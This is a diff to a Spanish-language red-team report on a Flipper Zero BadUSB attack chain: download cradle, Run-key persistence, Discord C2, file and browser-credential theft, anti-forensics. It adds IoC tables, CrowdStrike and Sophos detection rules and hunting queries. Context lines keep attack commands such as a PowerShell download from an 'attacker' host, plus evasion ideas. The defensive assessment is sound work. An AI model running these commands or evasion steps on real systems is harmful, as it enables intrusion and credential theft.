@@ -61,9 +61,27 @@ STRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-C [TLS fix];
 - Ejecutar scripts de auditoria de cumplimiento en estaciones sin acceso remoto
 - Simular ataques de insider threat con acceso fisico
 
-**Que deberia detectar el EDR:**
-- Ejecucion de PowerShell desde un dispositivo HID no autorizado
-- Dispositivos USB nuevos conectados (alerta de endpoint)
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `powershell.exe` lanzado como hijo de `explorer.exe` (Start Menu) o `RunDlg` (Win+R) |
+| Evento | Event ID 4688 (Process Creation) con commandline conteniendo `-WindowStyle Hidden` |
+| USB | Nuevo dispositivo HID registrado en `HKLM\SYSTEM\CurrentControlSet\Enum\USB` |
+| Evento | Event ID 6416 (PnP device connected) — si auditing de dispositivos esta habilitado |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| USB Device Control | Built-in (Policy) | **Device Control Policy** → se puede crear reglas para bloquear/alertar dispositivos HID nuevos. Requiere configuracion: por defecto NO monitorea teclados USB |
+| Suspicious PowerShell | Built-in (Toggle) | **"Suspicious Scripts and Commands"** en Prevention Policy — OFF por defecto. Si se habilita, detecta `-WindowStyle Hidden` |
+| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "-WindowStyle Hidden" AND ParentImageFileName CONTAINS "explorer.exe"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Peripheral Control | Built-in (Policy) | **Peripheral Control Policy** → se puede bloquear "Removable Media" y "Wireless Devices" pero NO filtra teclados HID especificamente |
+| AMSI | Built-in | AMSI en Sophos cubre PowerShell — pero solo si el script es lo suficientemente largo/sospechoso para triggear heuristicas |
+| Live Discover | Hunting | Query: `SELECT * FROM sophos_events WHERE event_type = 'USB_DEVICE_CONNECTED'` |
 
 ---
 
@@ -90,10 +108,30 @@ irm https://raw.githubusercontent.com/.../f44b1874d8cce12b_run.ps1 | iex
 - Codificar el cradle con `-EncodedCommand` para evadir firmas AMSI
 - Usar `mshta`, `regsvr32`, o `rundll32` como LOLBins alternativos
 
-**Que deberia detectar el EDR:**
-- Patron `irm ... | iex` es uno de los indicadores mas monitoreados
-- Conexiones salientes a `raw.githubusercontent.com` desde PowerShell
-- Script Block Logging deberia capturar el contenido descargado
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Red | Conexion HTTPS a `raw.githubusercontent.com:443` desde `powershell.exe` |
+| Evento | Event ID 4104 (Script Block Logging) — registra el contenido del script descargado |
+| Proceso | `powershell.exe` ejecutando `Invoke-RestMethod` + `Invoke-Expression` |
+| Sin disco | El script se ejecuta en memoria — no deja archivo en disco |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Script-Based Execution Monitoring | Built-in (Toggle) | **"Script-Based Execution Monitoring"** en Prevention Policy — analiza scripts PowerShell via AMSI. OFF por defecto |
+| Suspicious Scripts and Commands | Built-in (Toggle) | Detecta patrones `irm|iex`, `IEX(IWR(`, etc. OFF por defecto |
+| AMSI Integration | Built-in (Toggle) | **"AMSI"** toggle — intercepta contenido antes de ejecucion. OFF por defecto |
+| Custom IOA | Regla custom | Process Creation: `CommandLine MATCHES "irm.*\|.*iex"` o `CommandLine CONTAINS "Invoke-Expression"` |
+| Network | Built-in | Registra conexiones pero no bloquea `raw.githubusercontent.com` sin Custom IOA de tipo "Domain Name" |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| AMSI | Built-in | Sophos integra AMSI para PowerShell — deberia interceptar `irm|iex` si la heuristica lo marca como malicioso |
+| Threat Protection | Built-in | **"Detect malicious behavior"** en Threat Protection Policy — analiza cadenas de ejecucion sospechosas |
+| IPS | Built-in | Inspection de trafico de red — puede detectar download cradles conocidos |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE cmdline LIKE '%irm%iex%'` |
 
 ---
 
@@ -123,9 +161,26 @@ Que decodifica a:
 - Variable environment slicing para construir comandos letra por letra
 - XOR encoding con clave personalizada
 
-**Que deberia detectar el EDR:**
-- `-EncodedCommand` es un indicador de alta fidelidad
-- AMSI deberia decodificar y analizar el contenido antes de ejecutarlo
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `powershell.exe -NoP -W H -EncodedCommand <blob>` — visible en Event ID 4688 |
+| Evento | Event ID 4104 — Script Block Logging decodifica y registra el contenido real |
+| Registro | Prefetch file `POWERSHELL.EXE-*.pf` actualizado |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Suspicious Scripts and Commands | Built-in (Toggle) | Detecta `-EncodedCommand` como indicador de alta fidelidad. OFF por defecto |
+| AMSI | Built-in (Toggle) | Decodifica el base64 y analiza el contenido real antes de ejecucion |
+| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "-EncodedCommand" OR CommandLine CONTAINS "-enc"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| AMSI | Built-in | Decodifica `-EncodedCommand` y analiza contenido — deberia detectar `irm|iex` dentro |
+| Adaptive Attack Protection | Built-in | En modo activo (post-deteccion), bloquea PowerShell con `-EncodedCommand` automaticamente |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE cmdline LIKE '%EncodedCommand%'` |
 
 ---
 
@@ -150,8 +205,23 @@ $bt=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TVRVeU16QTJ...'
 - Almacenar en un registro de Windows o variable de entorno
 - Usar esteganografia para ocultar el token en una imagen
 
-**Que deberia detectar el EDR:**
-- Decodificacion de base64 seguida de uso como credencial de API
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `FromBase64String()` en el contexto de PowerShell — capturado por Script Block Logging |
+| Sin disco | El token decodificado solo existe en memoria como variable `$bt` |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Script-Based Execution Monitoring | Built-in (Toggle) | Puede identificar patrones de decodificacion base64 + uso como credencial |
+| No detectable en reposo | — | El token en base64 dentro del .ps1 en GitHub no es analizado por el EDR hasta ejecucion |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| AMSI | Built-in | Analiza el script decodificado — pero `FromBase64String` por si solo no es malicioso |
+| No detectable en reposo | — | Sophos no escanea contenido de repositorios remotos |
 
 ---
 
@@ -185,9 +255,30 @@ Expand-Archive -Path $pyZip -DestinationPath $pyDir -Force
 - Usar PowerShell puro sin Python (menos funcionalidad pero cero dependencias)
 - Descargar un binario Go compilado estaticamente
 
-**Que deberia detectar el EDR:**
-- Descarga y ejecucion de Python desde un directorio temporal/appdata
-- Instalacion de paquetes pip en ubicaciones no estandar
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Directorio | `%APPDATA%\FlipperBot\` — contiene python/, bot.py, config.py, creds_extractor.exe |
+| Archivo | `%APPDATA%\FlipperBot\python\python.exe` — Python 3.11.9 embebido |
+| Archivo | `%APPDATA%\FlipperBot\python\Lib\site-packages\discord\` — discord.py instalado |
+| Red | Conexiones a `www.python.org`, `bootstrap.pypa.io`, `pypi.org` desde PowerShell |
+| Proceso | `python.exe` ejecutandose desde `%APPDATA%\FlipperBot\python\` |
+| Prefetch | `PYTHON.EXE-*.pf` en `C:\Windows\Prefetch` |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Suspicious Processes | Built-in (Toggle) | **"Suspicious Processes"** — puede marcar python.exe ejecutandose desde AppData. OFF por defecto |
+| Custom IOA | Regla custom | Process Creation: `ImageFileName MATCHES "\\AppData\\.*\\python\.exe"` |
+| Custom IOA | Regla custom | File Creation: `TargetFileName MATCHES "\\AppData\\.*\\python-.*-embed.*"` |
+| Application Control | No disponible | CrowdStrike NO tiene whitelist de aplicaciones nativo — no puede bloquear Python portable |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Application Control | Built-in (Policy) | **Application Control Policy** — Python esta en el catalogo de aplicaciones controladas. Si se habilita, bloquea `python.exe` |
+| AMSI | Limitacion | **Python NO esta cubierto por AMSI en Sophos** — solo cubre PowerShell, VBScript, JScript. Python ejecuta sin inspeccion AMSI |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE process_name = 'python.exe' AND path LIKE '%AppData%'` |
 
 ---
 
@@ -215,9 +306,26 @@ Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
 - Servicio de Windows (requiere admin, T1543.003)
 - DLL search order hijacking en aplicaciones legitimas (T1574.001)
 
-**Que deberia detectar el EDR:**
-- Creacion/modificacion de claves en `...\CurrentVersion\Run` es uno de los indicadores mas basicos
-- El valor apunta a PowerShell oculto ejecutando Python desde AppData — altamente sospechoso
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Registro | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate` |
+| Valor | `powershell -WindowStyle Hidden -Command "& 'C:\Users\<user>\AppData\Roaming\FlipperBot\python\python.exe' 'C:\Users\<user>\AppData\Roaming\FlipperBot\bot.py'"` |
+| Evento | Event ID 13 (Sysmon: Registry Value Set) o Event ID 4657 (Security: Registry modification) |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Suspicious Registry Operations | Built-in (Toggle) | **"Suspicious Registry Operations"** — detecta modificaciones en claves Run. OFF por defecto |
+| Custom IOA | Regla custom | Registry: `RegObjectName CONTAINS "CurrentVersion\\Run" AND RegValueName = "WindowsSecurityUpdate"` |
+| Custom IOA | Regla custom | Process Creation (en boot): `CommandLine CONTAINS "WindowsSecurityUpdate" AND ImageFileName CONTAINS "powershell"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Threat Protection | Built-in | **"Detect malicious behavior"** — incluye heuristicas para persistencia en Run keys, pero depende del contexto |
+| Adaptive Attack Protection | Built-in | En modo activo, bloquea escrituras a claves Run desde procesos sospechosos |
+| Live Discover | Hunting | `SELECT * FROM registry WHERE path LIKE 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%' AND name = 'WindowsSecurityUpdate'` |
 
 ---
 
@@ -246,9 +354,28 @@ Atacante (Discord) <--HTTPS/WSS--> discord.com <--HTTPS/WSS--> Bot en PC victima
 - HTTPS beacon a un servidor propio (Cobalt Strike style)
 - GitHub Issues/Gists como dead drop C2
 
-**Que deberia detectar el EDR:**
-- Conexiones WebSocket persistentes a `gateway.discord.gg` desde un proceso Python no interactivo
-- Trafico a la API de Discord desde procesos que no son el cliente oficial
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Red | Conexion WebSocket persistente a `gateway.discord.gg:443` desde `python.exe` |
+| Red | Conexiones HTTPS a `discord.com/api/v*` desde `python.exe` |
+| DNS | Resoluciones DNS para `discord.com`, `gateway.discord.gg`, `cdn.discordapp.com` |
+| Proceso | `python.exe` con conexion de red persistente — no es interactivo (sin ventana) |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Custom IOA | Regla custom | Network Connection: `RemoteAddressIP IN [Discord IP ranges] AND ImageFileName CONTAINS "python.exe"` |
+| Custom IOA | Regla custom | Domain Name: `DomainName = "gateway.discord.gg" AND ImageFileName NOT CONTAINS "Discord.exe"` |
+| No hay toggle nativo | — | CrowdStrike no tiene toggle especifico para detectar C2 sobre servicios web legitimos — requiere Custom IOA |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Web Control | Built-in (Policy) | **Web Control Policy** — puede categorizar Discord como "File Sharing" y bloquear, pero afecta tambien al uso legitimo |
+| IPS | Built-in | Inspeccion de trafico — no detecta WebSocket a Discord como C2 (es trafico HTTPS normal) |
+| Application Control | Built-in (Policy) | Puede bloquear Discord como aplicacion, pero NO distingue entre el cliente y un bot Python |
+| Live Discover | Hunting | `SELECT * FROM sophos_network_journal WHERE destination LIKE '%discord%' AND process_name = 'python.exe'` |
 
 ---
 
@@ -266,6 +393,13 @@ latency = round(bot.latency * 1000)  # Latencia del WebSocket
 | Tecnica | ID | Tactica |
 |---|---|---|
 | (Operacional - no mapea directamente) | — | — |
+
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Sin IoC adicional | Solo mide latencia del WebSocket ya establecido — no genera artefactos nuevos |
+
+**Deteccion CrowdStrike / Sophos:** No detectable como accion independiente — es trafico normal del WebSocket C2.
 
 **Alternativas de uso:**
 - Heartbeat check para monitorear multiples implantes
@@ -301,8 +435,22 @@ psutil.boot_time()           # Uptime
 - Detectar si es una VM/sandbox (T1497)
 - Enumerar grupos y privilegios del usuario (T1069)
 
-**Que deberia detectar el EDR:**
-- Consultas masivas de informacion del sistema desde un proceso Python no interactivo
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | Llamadas a WMI/API del sistema (`platform.*`, `psutil.*`) desde `python.exe` |
+| Red | Respuesta enviada via Discord API — datos del sistema en texto plano en el canal C2 |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| No detectable | — | Consultas de informacion del sistema son operaciones normales de cualquier proceso — no hay toggle ni IOA util |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| No detectable | — | `psutil` y `platform` son llamadas de sistema normales — no triggerean ningun mecanismo de deteccion |
+| Live Discover | Hunting | No practico — la enumeracion de sistema es demasiado comun para crear reglas utiles |
 
 ---
 
@@ -331,9 +479,24 @@ img.save(buf, format="PNG")  # Convierte a PNG en memoria
 - Captura de clipboard (T1115)
 - Keylogger para capturar texto escrito (T1056.001)
 
-**Que deberia detectar el EDR:**
-- Llamadas a API de captura de pantalla desde procesos no autorizados
-- Envio de imagenes PNG a servidores externos inmediatamente despues de captura
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `python.exe` llamando a `ImageGrab.grab()` (Win32 API: `BitBlt`/`GetDC`) |
+| Red | Archivo PNG enviado como upload a Discord API (`discord.com/api/*/channels/*/messages`) |
+| Memoria | Imagen existe solo en memoria (BytesIO) — no se escribe a disco |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| No hay toggle especifico | — | CrowdStrike no tiene toggle para captura de pantalla. La API `BitBlt`/`GetDC` es usada por aplicaciones legitimas |
+| Custom IOA | Dificil | No hay tipo de IOA que cubra llamadas a GDI/screen capture — solo Process/File/Network/Registry |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| No detectable | — | Sophos no monitorea llamadas a APIs de captura de pantalla |
+| Exploit Mitigation | Built-in | Solo aplica a procesos protegidos (navegadores, Office) — Python no esta en la lista |
 
 ---
 
@@ -354,6 +517,22 @@ $s.Speak("texto del atacante")
 |---|---|---|
 | PowerShell | T1059.001 | Execution |
 | Internal Defacement | T1491.001 | Impact |
+
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `powershell.exe` hijo de `python.exe` — carga `System.Speech` assembly |
+| Audio | Speaker del sistema produce audio — observable fisicamente |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Custom IOA | Regla custom | Process Creation: `ParentImageFileName CONTAINS "python.exe" AND CommandLine CONTAINS "System.Speech"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| No detectable | — | Cargar `System.Speech` no es malicioso — es un assembly .NET legitimo |
 
 **Alternativas de uso:**
 - Demostracion de impacto en presentaciones de concientizacion
@@ -380,6 +559,14 @@ $n.ShowBalloonTip(5000, 'titulo', 'mensaje', [System.Windows.Forms.ToolTipIcon]:
 | Tecnica | ID | Tactica |
 |---|---|---|
 | Internal Defacement | T1491.001 | Impact |
+
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `powershell.exe` hijo de `python.exe` — carga `System.Windows.Forms` |
+| UI | Notificacion toast visible para el usuario — puede alertar a la victima |
+
+**Deteccion CrowdStrike / Sophos:** Mismo que `!say` — PowerShell hijo de Python con assembly .NET. No hay deteccion especifica para notificaciones toast.
 
 **Alternativas de uso:**
 - Phishing interno: "Su sesion ha expirado, haga clic para renovar"
@@ -421,9 +608,26 @@ subprocess.run(
 !cmd dir /s /b *.pdf               # Buscar archivos PDF
 ```
 
-**Que deberia detectar el EDR:**
-- Ejecucion de `cmd.exe` como hijo de un proceso Python en AppData
-- Comandos de reconocimiento (`whoami`, `net user`, `netstat`) en secuencia rapida
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `cmd.exe` como hijo de `python.exe` (en AppData) — cadena: python.exe → cmd.exe |
+| Evento | Event ID 4688 — muestra `cmd /C <comando>` con el comando completo |
+| Resultado | Output del comando viaja por HTTPS a Discord API — exfiltrado automaticamente |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Suspicious Processes | Built-in (Toggle) | Puede detectar `cmd.exe` lanzado desde un proceso no estandar en AppData |
+| Custom IOA | Regla custom | Process Creation: `ParentImageFileName MATCHES "\\AppData\\.*python\.exe" AND ImageFileName CONTAINS "cmd.exe"` |
+| Custom IOA | Regla custom | Process Creation: `CommandLine MATCHES "(whoami|net user|netstat|tasklist)" AND ParentImageFileName CONTAINS "python.exe"` — detecta reconocimiento |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Threat Protection | Built-in | **"Detect malicious behavior"** — puede detectar cadenas de procesos sospechosas (python → cmd) |
+| Adaptive Attack Protection | Built-in | En modo activo, puede bloquear `cmd.exe` lanzado desde procesos no confiables |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE parent_name = 'python.exe' AND process_name = 'cmd.exe'` |
 
 ---
 
@@ -460,9 +664,27 @@ subprocess.run(
 !ps Invoke-WebRequest -Uri http://attacker/tool -OutFile C:\temp\tool.exe  # Descargar herramienta
 ```
 
-**Que deberia detectar el EDR:**
-- PowerShell ejecutado como hijo de Python con `-NoProfile`
-- Script Block Logging deberia capturar cada comando
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `powershell.exe -NoProfile -Command <cmd>` como hijo de `python.exe` |
+| Evento | Event ID 4104 (Script Block Logging) — captura cada comando ejecutado |
+| Evento | Event ID 4688 — muestra la linea de comandos completa |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Script-Based Execution Monitoring | Built-in (Toggle) | Captura y analiza cada bloque de script PowerShell ejecutado |
+| AMSI | Built-in (Toggle) | Intercepta comandos PowerShell antes de ejecucion |
+| Suspicious Scripts and Commands | Built-in (Toggle) | Detecta cmdlets ofensivos conocidos como `Invoke-WebRequest`, `Get-WmiObject` en contexto sospechoso |
+| Custom IOA | Regla custom | Process Creation: `ParentImageFileName CONTAINS "python.exe" AND ImageFileName CONTAINS "powershell.exe" AND CommandLine CONTAINS "-NoProfile"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| AMSI | Built-in | Cubre PowerShell — analiza cada comando. Efectividad depende de heuristicas (cmdlets comunes pasan) |
+| Threat Protection | Built-in | Cadena python.exe → powershell.exe es sospechosa — depende de sensitivity level |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE parent_name = 'python.exe' AND process_name = 'powershell.exe'` |
 
 ---
 
@@ -492,9 +714,25 @@ await ctx.send(file=discord.File(path))
 !download C:\Windows\System32\config\SAM          # Requiere SYSTEM
 ```
 
-**Que deberia detectar el EDR:**
-- Lectura de archivos sensibles seguida de trafico saliente a Discord
-- Acceso a archivos en rutas de credenciales
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Archivo | Archivo leido por `python.exe` — visible en file access logs (Sysmon Event ID 11) |
+| Red | Archivo enviado como multipart upload a `discord.com/api/*/channels/*/messages` |
+| Proceso | `python.exe` abriendo archivos fuera de su directorio de trabajo |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Custom IOA | Regla custom | File Read (no disponible como IOA type) — CrowdStrike Custom IOA NO soporta "file read" como evento, solo file creation/write |
+| Sensor Visibility | Telemetria | El sensor registra accesos a archivos — visible en Investigate pero no como prevencion automatica |
+| No prevenible nativamente | — | Sin regla custom que combine "python.exe lee archivo + envia datos a discord.com" |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Data Loss Prevention | No incluido | Sophos Intercept X NO incluye DLP nativo — no puede detectar exfiltracion de archivos por contenido |
+| Live Discover | Hunting | `SELECT * FROM sophos_network_journal WHERE process_name = 'python.exe' AND bytes_sent > 100000 AND destination LIKE '%discord%'` |
 
 ---
 
@@ -528,9 +766,25 @@ with open(dest, 'wb') as f:
 
 **Nota:** Actualmente bloqueado por el proxy SSL corporativo (403 en cdn.discordapp.com). Esto es un hallazgo positivo — el proxy SSL esta cumpliendo su funcion de inspeccion.
 
-**Que deberia detectar el EDR:**
-- Descarga de archivos desde CDN de Discord hacia rutas del sistema
-- Archivos ejecutables escritos en disco desde procesos Python
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Archivo | Archivo escrito en la ruta destino por `python.exe` |
+| Red | Descarga desde `cdn.discordapp.com` (actualmente bloqueado por proxy — 403) |
+| Proceso | `python.exe` escribiendo archivos fuera de su directorio |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Custom IOA | Regla custom | File Creation: `TargetFileName MATCHES ".*\.(exe|ps1|bat|dll)" AND ImageFileName CONTAINS "python.exe"` — detecta escritura de ejecutables |
+| Sensor Visibility | Telemetria | Registra file writes — busqueable en Investigate |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Web Control / IPS | Built-in | **Proxy SSL activo bloquea descargas de `cdn.discordapp.com`** — esta deteccion YA funciona en el entorno de pruebas |
+| Threat Protection | Built-in | Escanea archivos escritos en disco — detectaria malware conocido |
+| Live Discover | Hunting | `SELECT * FROM sophos_file_journal WHERE process_name = 'python.exe' AND path NOT LIKE '%FlipperBot%'` |
 
 ---
 
@@ -564,11 +818,35 @@ with open(dest, 'wb') as f:
 - Extraer datos de autofill (tarjetas de credito, direcciones)
 - Dumping de credenciales con Mimikatz (requiere admin)
 
-**Que deberia detectar el EDR:**
-- `CreateRemoteThread` en proceso de Chrome/Edge — indicador critico
-- `VirtualAllocEx` + `WriteProcessMemory` (patron clasico de inyeccion)
-- Lectura de archivos `Login Data` y `Local State` por un proceso externo
-- Llamadas a `CryptUnprotectData` desde un proceso no-navegador
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `creds_extractor.exe` ejecutado desde `%APPDATA%\FlipperBot\` |
+| Proceso | `chrome.exe` lanzado en estado suspendido por `creds_extractor.exe` |
+| DLL | `abe_decrypt.dll` cargada en el espacio de memoria de Chrome via `LoadLibraryA` |
+| API | `CreateRemoteThread`, `VirtualAllocEx`, `WriteProcessMemory` — patron clasico de DLL injection |
+| Archivo | Copia de `Login Data` (SQLite) en directorio temporal |
+| Archivo | `creds_<timestamp>.txt` generado y enviado a Discord |
+| Named Pipe | Comunicacion entre `creds_extractor.exe` y la DLL inyectada |
+| DPAPI | Llamada a `CryptUnprotectData` desde un proceso no-navegador |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Code Injection | Built-in (Toggle) | **"Code Injection"** en Prevention Policy — detecta `CreateRemoteThread` + `VirtualAllocEx`. OFF por defecto. **Si se habilita, DEBERIA bloquear este ataque** |
+| Credential Theft | Built-in (Toggle) | **"Credential Dumping"** y **"Credential Access"** — multiples toggles para proteger credenciales del navegador. OFF por defecto |
+| Suspicious Processes | Built-in (Toggle) | Detecta procesos desconocidos que acceden a archivos de credenciales del navegador |
+| Custom IOA | Regla custom | Process Creation: `ImageFileName CONTAINS "creds_extractor" OR CommandLine CONTAINS "Login Data"` |
+| Custom IOA | Regla custom | File Creation: `TargetFileName MATCHES "creds_.*\.txt"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Exploit Mitigation | Built-in | **"Code cave utilization"** y **"DLL hijacking"** en Exploit Mitigation — PERO solo protege procesos listados (navegadores SI estan). Deberia detectar inyeccion en Chrome |
+| Credential Theft Protection | Built-in | **"Prevent credential theft"** en Threat Protection — protege contra dumping de credenciales. PERO depende de si el metodo esta en la base de firmas |
+| CryptoGuard | Built-in | No aplica — CryptoGuard es para ransomware, no credential theft |
+| AMSI | Limitacion | `creds_extractor.exe` es un binario Rust — **AMSI NO cubre binarios compilados**, solo scripts |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE process_name = 'creds_extractor.exe'` |
 
 ---
 
@@ -591,6 +869,14 @@ WATCHDOG_PROCESSES = [
 |---|---|---|
 | Security Software Discovery | T1518.001 | Discovery |
 | Process Discovery | T1057 | Discovery |
+
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Proceso | `python.exe` enumerando procesos activos cada 30 segundos via `psutil` |
+| Sin artefacto en disco | Solo opera en memoria — no genera archivos |
+
+**Deteccion CrowdStrike / Sophos:** No detectable — la enumeracion de procesos es una operacion normal del sistema. No hay toggle ni regla que distinga esto de un proceso legitimo usando `psutil`.
 
 **Alternativas de uso:**
 - Agregar deteccion de debuggers (x64dbg, OllyDbg, IDA)
@@ -629,10 +915,30 @@ WATCHDOG_PROCESSES = [
 - Sobrescribir archivos antes de borrar (wipe seguro)
 - Limpiar Prefetch files y Amcache
 
-**Que deberia detectar el EDR:**
-- Eliminacion masiva de artefactos forenses en secuencia rapida
-- Modificacion del historial de PowerShell
-- Flush de DNS cache desde un proceso no interactivo
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Registro | Eliminacion de `HKCU\...\Run\WindowsSecurityUpdate` |
+| Archivo | Eliminacion de `%APPDATA%\FlipperBot\` (toda la carpeta) |
+| Proceso | `powershell.exe` ejecutando `Remove-ItemProperty`, `Remove-Item -Recurse`, `ipconfig /flushdns` |
+| Evento | Event ID 4688 — muestra los comandos de limpieza |
+| Archivo | Modificacion del historial de PowerShell (`ConsoleHost_history.txt`) |
+| DNS | Flush de cache DNS — Event ID en DNS Client log |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Suspicious Registry Operations | Built-in (Toggle) | Detecta eliminacion de claves Run |
+| Anti-Forensics | Built-in (Toggle) | **"Intelligence-Sourced Threats"** puede correlacionar eliminacion masiva de artefactos como anti-forensics |
+| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "flushdns" AND ParentImageFileName CONTAINS "python.exe"` |
+| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "ConsoleHost_history" AND CommandLine MATCHES "(Remove|Clear|Set-Content)"` |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| Threat Protection | Built-in | **"Detect malicious behavior"** — eliminacion masiva de artefactos en secuencia rapida es un patron de anti-forensics |
+| Adaptive Attack Protection | Built-in | En modo activo, bloquea comandos de limpieza desde procesos no confiables |
+| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE cmdline LIKE '%flushdns%' OR cmdline LIKE '%ConsoleHost_history%'` |
 
 ---
 
@@ -657,10 +963,56 @@ ssl.create_default_context = _no_verify_ctx
 |---|---|---|
 | Subvert Trust Controls | T1553 | Defense Evasion |
 
+**IoCs en la PC victima:**
+| Tipo | Detalle |
+|---|---|
+| Codigo | Monkey-patch de `ssl.create_default_context` en runtime de Python — solo en memoria |
+| Red | Conexiones HTTPS sin validacion de certificado — el proxy SSL ve el trafico descifrado |
+| Sin disco | La modificacion es en runtime de Python — no persiste en disco |
+
+**Deteccion CrowdStrike:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| No detectable | — | El monkey-patch es interno al proceso Python — CrowdStrike no inspecciona runtime de Python |
+| SSL Inspection | Built-in | CrowdStrike SI intercepta el trafico TLS — pero el bot ignora el certificado MITM y funciona |
+
+**Deteccion Sophos:**
+| Capacidad | Tipo | Detalle |
+|---|---|---|
+| SSL/TLS Inspection | Built-in | Sophos intercepta y re-firma trafico — el bot ignora la verificacion. Sophos VE el trafico descifrado pero no lo bloquea |
+| No detectable como tecnica | — | Deshabilitar verificacion SSL es una practica comun en scripts — no hay firma para esto |
+
 **Alternativas de uso:**
 - Extraer el certificado CA corporativo y agregarlo al trust store
 - Usar DNS over HTTPS para C2 (evita inspeccion SSL completamente)
 - Tunneling via ICMP o DNS que no pasa por el proxy
+
+---
+
+## Resumen de Deteccion EDR por Paso
+
+| Paso | CrowdStrike | Sophos | Detectable? |
+|---|---|---|---|
+| 1. BadUSB/HID | Device Control Policy (config) | Peripheral Control (config) | Solo si se configura |
+| 2. Download Cradle | Script Monitoring + AMSI (OFF) | AMSI + Threat Protection | Solo si se habilita |
+| 3. EncodedCommand | Suspicious Scripts (OFF) | AMSI + Adaptive Attack | Solo si se habilita |
+| 4. Token Base64 | Script Monitoring (OFF) | AMSI (bajo riesgo) | Poco probable |
